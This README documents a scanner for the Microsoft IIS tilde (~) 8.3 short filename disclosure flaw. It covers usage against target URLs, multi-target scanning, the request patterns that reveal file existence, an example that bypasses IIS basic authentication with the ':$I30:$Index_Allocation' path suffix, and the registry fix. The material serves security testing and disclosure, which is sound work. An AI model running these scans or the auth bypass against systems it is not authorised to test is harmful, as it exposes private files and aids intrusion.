IIS Short Name Scanner
=====================
The latest version of scanner for IIS short file name (8.3) disclosure vulnerability by using the tilde (~) character.

Description
-------------
Microsoft IIS contains a flaw that may lead to an unauthorized information disclosure. The issue is triggered during the parsing of a request that contains a tilde character (~). This may allow a remote attacker to gain access to file and folder name information.

This scanner was moved from https://code.google.com/p/iis-shortname-scanner-poc/ to GitHub for better support.

Original research file: http://soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf

It is possible to detect short names of files and directories which have an 8.3 equivalent in Windows by using some vectors in several versions of Microsoft IIS. For instance, it is possible to detect all short-names of ".aspx" files as they have 4 letters in their extensions.

Note: new techniques have been introduced to the latest versions of this scanner and it can now scan IIS8.5 when it is vulnerable. 

It is not easy to find the original file or folder names based on the short names. However, the following methods are recommended as examples:
- If you can guess the full extension (for instance .ASPX when the 8.3 extension is .ASP), always try the short name with the full extension.
- Sometimes short names are listed in Google which can be used to find the actual names
- Using text dictionary files is also recommended. If a name starts with another word, the second part should be guessed based on a dictionary file separately. For instance, ADDACC~1.ASP can be AddAccount.aspx, AddAccounts.aspx, AddAccurateMargine.aspx, etc
- Searching in the website contents and resources can also be useful to find the full name. This can be achieved for example by searching Site Map in the Burp Suite tool.

Installation
--------------
The recent version has been compiled by using Open JDK 17 (an old jar fail for JDK7 is also available). 
You will need to download files in the [/release] directory to use this old application!

You can also compile this application yourself. Please submit any issues in GitHub for further investigation.
It should be straight forward to open this project in Eclipse as well.

Usage
-------

### Command line options

USAGE 1 (To verify if the target is vulnerable with the default config file):
```
java --illegal-access=permit --add-opens java.base/java.net=ALL-UNNAMED  -jar iis_shortname_scanner.jar [URL]
```

USAGE 2 (To find 8.3 file names with the default config file):
```
java --illegal-access=permit --add-opens java.base/java.net=ALL-UNNAMED -jar iis_shortname_scanner.jar [ShowProgress] [ThreadNumbers] [URL]
```

USAGE 3 (To verify if the target is vulnerable with a new config file):
```
java --illegal-access=permit --add-opens java.base/java.net=ALL-UNNAMED -jar iis_shortname_scanner.jar [URL] [configFile]
```

USAGE 4 (To find 8.3 file names with a new config file):
```
java --illegal-access=permit --add-opens java.base/java.net=ALL-UNNAMED -jar iis_shortname_scanner.jar [ShowProgress] [ThreadNumbers] [URL] [configFile]
```

USAGE 5 (To scan multiple targets using a linux box):
```
./multi_targets.sh <scope file> <is_default_https (1=https)>
```

DETAILS:
```
 [ShowProgress]: 0= Show final results only - 1= Show final results step by step  - 2= Show Progress
 [ThreadNumbers]: 0= No thread - Integer Number = Number of concurrent threads [be careful about IIS Denial of Service]
 [URL]: A complete URL - starts with http/https protocol
 [configFile]: path to a new config file which is based on config.xml
```

Examples:
```
- Example 0 (to see if the target is vulnerable):
 java --illegal-access=permit --add-opens java.base/java.net=ALL-UNNAMED -jar iis_shortname_scanner.jar http://example.com/folder/

- Example 1 (uses no thread - very slow):
 java --illegal-access=permit --add-opens java.base/java.net=ALL-UNNAMED -jar iis_shortname_scanner.jar 2 0 http://example.com/folder/new%20folder/

- Example 2 (uses 20 threads - recommended):
 java --illegal-access=permit --add-opens java.base/java.net=ALL-UNNAMED -jar iis_shortname_scanner.jar 2 20 http://example.com/folder/new%20folder/

- Example 3 (saves output in a text file):
 java --illegal-access=permit --add-opens java.base/java.net=ALL-UNNAMED -jar iis_shortname_scanner.jar 0 20 http://example.com/folder/new%20folder/ > c:\results.txt

- Example 4 (bypasses IIS basic authentication):
 java --illegal-access=permit --add-opens java.base/java.net=ALL-UNNAMED -jar iis_shortname_scanner.jar 2 20 http://example.com/folder/AuthNeeded:$I30:$Index_Allocation/

- Example 5 (using a new config file):
 java --illegal-access=permit --add-opens java.base/java.net=ALL-UNNAMED -jar iis_shortname_scanner.jar 2 20 http://example.com/folder/ newconfig.xml 
 
- Example 6 (scanning multiple targets using a linux box):
 ./multi_targets.sh scope.txt 1
```

Note 1: Edit config.xml file to change the scanner settings and add additional headers.
Note 2: Sometimes it does not work for the first time and you need to try again.


How Does It Work?
------------------
In the following examples, IIS responds with a different message when a file exists:
```
http://target/folder/valid*~1.*/.aspx
http://target/folder/invalid*~1.*/.aspx
```

However, different IIS servers may respond differently, and for instance some of them may work with the following or other similar patterns:
```
http://target/folder/valid*~1.*\.asp
http://target/folder/invalid*~1.*\.asp
```
Method of sending the request such as GET, POST, OPTIONS, DEBUG, ... is also important.

I believe monitoring the requests by using a proxy is the best way of understating this issue and this scanner.


How To Fix This Issue
----------------------
Microsoft will not patch this security issue. Their last response is as follows:
```
Thank you for contacting the Microsoft Security Response Center.  

We appreciate your bringing this to our attention.  Our previous guidance stands: deploy IIS with 8.3 names disabled.  
```

Therefore, it is recommended to deploy IIS with 8.3 names disabled by creating the following registry key on a Windows operating system:
```
	Key:   HKLM\SYSTEM\CurrentControlSet\Control\FileSystem
	Name:  NtfsDisable8dot3NameCreation 
	Value:        1 
```

Note: The web folder needs to be recreated, as the change to the NtfsDisable8dot3NameCreation registry entry affects only files and directories that are created after the change, so the files that already exist are not affected.


References
------------
One of the new methods: https://soroush.secproject.com/blog/2014/08/iis-short-file-name-disclosure-is-back-is-your-server-vulnerable/

Original research file: http://soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf

Website Reference: http://soroush.secproject.com/blog/2012/06/microsoft-iis-tilde-character-vulnerabilityfeature-short-filefolder-name-disclosure/

Video Link: http://www.youtube.com/watch?v=XOd90yCXOP4

http://www.osvdb.org/83771

http://www.exploit-db.com/exploits/19525/

http://securitytracker.com/id?1027223


